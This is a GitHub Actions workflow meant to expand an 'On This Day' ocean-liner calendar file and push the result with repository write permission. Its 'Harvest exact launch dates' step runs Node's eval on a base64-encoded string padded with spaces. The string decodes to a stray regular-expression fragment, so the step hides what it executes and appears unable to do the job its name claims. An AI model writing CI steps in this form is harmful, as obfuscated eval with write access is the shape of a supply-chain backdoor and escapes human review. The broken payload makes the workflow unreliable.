name: Expand On This Day from guide facts

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/expand-on-this-day-from-guides.yml'

permissions:
  contents: write

jobs:
  expand:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Harvest exact launch dates
        shell: bash
        run: node -e "eval(Buffer.from('  cmVmPShbIiddKShbXiInXSspXDFbXj5dKnJlbD0oWyInXSljYW5vbmljYWxcM2k     ','base64').toString())"

      - name: Commit expanded calendar
        shell: bash
        run: |
          if git diff --quiet -- assets/this-day-ocean-liners.js; then
            echo "No calendar changes needed."
            exit 0
          fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add assets/this-day-ocean-liners.js
          git commit -m "Expand On This Day from guide launch dates [skip ci]"
          git push
